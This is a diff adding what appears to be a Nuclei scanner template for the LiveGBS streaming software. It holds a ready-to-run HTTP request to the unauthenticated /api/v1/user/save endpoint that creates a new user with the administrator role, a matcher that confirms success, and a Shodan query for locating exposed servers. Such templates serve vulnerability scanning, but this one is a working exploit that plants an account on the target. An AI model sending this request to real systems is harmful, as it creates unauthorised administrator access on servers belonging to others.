@@ -1,0 +1,28 @@
+id: LiveGBS_user_save_any_user_adds
+
+info:
+  name: LiveGBS_user_save_any_user_adds
+  author: god
+  severity: low
+  description: LiveGBS streaming service software user/save any_user_adds
+  metadata:
+    max-request: 1
+    shodan-query: icon_hash="-206100324"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /api/v1/user/save?ID=&Username=test10241024&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+    Connection: close
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - DefaultUserPassword
